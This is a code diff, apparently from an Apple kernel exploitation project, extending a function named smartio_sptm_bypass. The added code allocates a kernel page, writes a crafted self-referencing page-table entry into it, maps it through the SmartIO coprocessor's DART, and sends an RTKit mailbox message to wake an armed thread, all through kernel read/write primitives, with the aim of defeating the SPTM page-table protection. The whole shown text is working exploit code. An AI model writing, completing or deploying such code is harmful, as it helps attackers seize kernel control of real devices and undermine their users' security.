+        }
+    }
+
+    if (!found_thread_phys) {
+        fprintf(stderr, "[!] Thread descriptor not found — using mailbox-only wake\n");
+    }
+
+    /* Kick the RTKit scheduler via mailbox IRQ */
+    if (smartio_mbox_base) {
+        fprintf(stderr, "    Sending mailbox IRQ to trigger scheduler...\n");
+        /*
+         * Send a RTKit MGMT message (endpoint 0, type PING).
+         * RTKit message format: bits[7:0]=endpoint, bits[63:8]=data
+         * PING = endpoint 0, type 1
+         */
+        uint32_t msg_lo = 0x00000100;  /* endpoint 0, ping */
+        uint32_t msg_hi = 0x00000000;
+
+        /* Wait for send FIFO to have space */
+        for (int i = 0; i < 100; i++) {
+            uint32_t ctrl = kread32(smartio_mbox_base + MBOX_SEND_CTRL);
+            if (ctrl & MBOX_SEND_EMPTY) break;
+            usleep(100);
+        }
+
+        kwrite32(smartio_mbox_base + MBOX_SEND_DATA_LO, msg_lo);
+        kwrite32(smartio_mbox_base + MBOX_SEND_DATA_HI, msg_hi);
+        kwrite32(smartio_mbox_base + MBOX_SEND_CTRL, 1);  /* trigger */
+
+        fprintf(stderr, "[+] Mailbox message sent — scheduler should run\n");
+    } else {
+        fprintf(stderr, "[!] No mailbox base — relying on state change only\n");
+        fprintf(stderr, "    Thread will wake on next timer tick\n");
+    }
 
     return 0;
 }
@@ -706,12 +1335,37 @@ smartio_sptm_bypass(uint64_t kernel_base)
         return -1;
     }
 
-    /* Phase 5: Prepare our PTE data in SmartIO-accessible memory */
-    /* We need a second DART mapping pointing to memory we control,
-     * containing the PTE value we want to write */
-    uint64_t our_data_phys = 0;  /* Physical address of our PTE data */
+    /*
+     * Phase 5: Prepare our PTE data in SmartIO-accessible memory.
+     * We need a second DART mapping pointing to memory we control,
+     * containing the crafted PTE value we want memcpy to write.
+     */
+
+    /* Allocate a kernel page to hold our PTE payload */
+    uint64_t payload_kva = kalloc(0x4000);
+    if (payload_kva == 0) {
+        fprintf(stderr, "[-] Failed to allocate payload buffer\n");
+        return -1;
+    }
+    uint64_t our_data_phys = kvtophys(payload_kva);
+    if (our_data_phys == 0) {
+        fprintf(stderr, "[-] Failed to get payload physical address\n");
+        return -1;
+    }
+
+    /* Write the self-referencing PTE into the payload buffer */
+    uint64_t self_ref_pte = make_pte(pte_page_phys, 1);  /* R/W to own page */
+    kwrite64(our_data_phys, self_ref_pte);
+    fprintf(stderr, "[+] Payload: self-referencing PTE 0x%llx at phys 0x%llx\n",
+            self_ref_pte, our_data_phys);
+
+    /* Create second DART mapping: SmartIO VA 0x101000 → payload page */
     uint64_t smartio_src_va = 0x101000;
-    /* TODO: Allocate and fill with self-referencing PTE */
+    ret = create_dart_mapping(smartio_src_va, our_data_phys);
+    if (ret != 0) {
+        fprintf(stderr, "[-] Failed to create source DART mapping\n");
+        return -1;
+    }
 
     /* Phase 6: Arm sleeping thread */
     ret = arm_sleeping_thread(&threads[0],
